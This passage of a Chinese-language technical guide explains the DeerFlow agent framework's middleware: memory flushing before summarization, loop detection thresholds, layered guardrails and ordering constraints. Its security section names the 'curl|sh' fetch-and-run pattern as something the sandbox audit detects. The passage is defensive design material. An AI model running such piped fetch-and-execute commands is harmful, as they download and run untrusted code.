> "在 DeerFlow 中，如果 MemoryMiddleware 排在 SummarizationMiddleware 前面，会导致信息丢失。SummarizationMiddleware 在压缩上下文时会删除旧消息，而 MemoryMiddleware 需要这些消息来提取记忆。DeerFlow 的解决方案是 **BeforeSummarizationHook**——压缩前通知记忆系统冲刷即将被删除的消息，确保信息在删除前被捕获。这种'事件驱动的跨中间件协调'比简单的顺序保证更健壮，因为它不依赖于中间件的相对位置，而是依赖于显式的事件通知。"

### Q3: 如何防止 Agent 陷入无限工具调用循环？

**标准回答**：

设置最大迭代次数（max_iterations），超过后强制停止。

**加分项**：

> "DeerFlow 的 LoopDetectionMiddleware 实现了**双层检测**：哈希检测在滑动窗口内追踪相同工具调用模式的重复次数（≥3 警告，≥5 强制停止），频率检测追踪单工具类型的累计调用次数（≥30 警告，≥50 强制停止）。关键细节是**稳定键派生**——对 `read_file` 的行范围参数按 200 分桶，避免读取同一文件不同行范围产生误报；对 `write_file`/`str_replace` 哈希完整参数，因为写操作内容不同就是不同调用。强制停止不是简单抛异常，而是**剥离 tool_calls 并设置 finish_reason='stop'**，让模型自然地输出文本回答而非继续调用工具。"

### Q4: 如何在 Agent 系统中实现"安全优先"的护栏？

**标准回答**：

在工具执行前检查权限，拒绝危险操作。

**加分项**：

> "DeerFlow 的安全设计有三个层次：第一层是 **GuardrailMiddleware**——可插拔的 GuardrailProvider Protocol，采用 fail-closed 策略（Provider 异常时默认阻止调用）；第二层是 **SandboxAuditMiddleware**——两阶段命令分类，整命令扫描捕获多语句攻击（如 `curl|sh`），子命令逐个分类捕获复合命令中的危险子命令，引用感知分割防止引号内的分隔符被误解析；第三层是 **LoopDetectionMiddleware**——防止 Agent 被诱导反复执行危险命令。三层纵深防御确保即使一层被绕过，下一层仍能拦截。"

### Q5: 为什么 ClarificationMiddleware 必须排在最后？

**标准回答**：

因为它会中断执行流程，如果前面还有中间件需要处理，会被跳过。

**加分项**：

> "ClarificationMiddleware 返回 `Command(goto=END)` 中断 LangGraph 的执行图。在 LangGraph 的语义中，`goto=END` 会立即跳转到图的终止节点，跳过所有后续处理。如果 MemoryMiddleware 排在它后面，记忆不会入队；如果 SandboxMiddleware 的 `after_agent` 排在后面，沙箱不会释放。DeerFlow 通过**硬编码位置约束**（始终 append 在最后）+ **自定义中间件锚点**（@Prev(ClarificationMiddleware)）来保证这个不变量。"

---

## 8. 扩展思考

### 8.1 局限与改进方向

| 局限 | 改进方向 |
|------|---------|
| 中间件顺序硬编码在 `_build_middlewares()` 中 | 声明式依赖图（如 `@Depends(SandboxMiddleware)`），运行时拓扑排序 |
| RuntimeFeatures 未被 `agent.py` 实际使用 | 迁移到 RuntimeFeatures 驱动的组装方式 |
| 中间件间通信依赖隐式 state 键 | 显式中间件间通信协议（如 MiddlewareContext） |
| 无中间件级测试工具 | 提供 MiddlewareTestHarness，模拟 state + runtime |
| 循环检测的阈值全局固定 | 自适应阈值（根据工具类型、任务复杂度动态调整） |

### 8.2 如果重新设计

1. **声明式依赖**：每个中间件声明 `requires` 和 `provides`，系统自动拓扑排序
2. **中间件分组**：将 18 个中间件分为 4 组（Infrastructure / Security / Business / Interaction），组内可重排，组间固定序
3. **中间件配置 Schema**：每个中间件有自己的 Pydantic Config 类，类型安全
4. **中间件指标**：每个中间件自动记录执行时间、调用次数、错误率
5. **中间件热插拔**：运行时启用/禁用中间件，无需重启

### 8.3 与前沿研究/产品的关联

- **Anthropic Claude Code**：使用类似的 hooks 系统（before/after tool call），但更轻量
- **OpenAI Agents SDK**：使用 `guardrails` + `handoffs`，但无统一中间件抽象
- **Google ADK**：使用 `before_model_callback` / `after_model_callback`，类似 DeerFlow 的 before/after 钩子
- **学术方向**：形式化验证中间件链的安全性（如用 TLA+ 验证"循环检测一定在审计之后"）
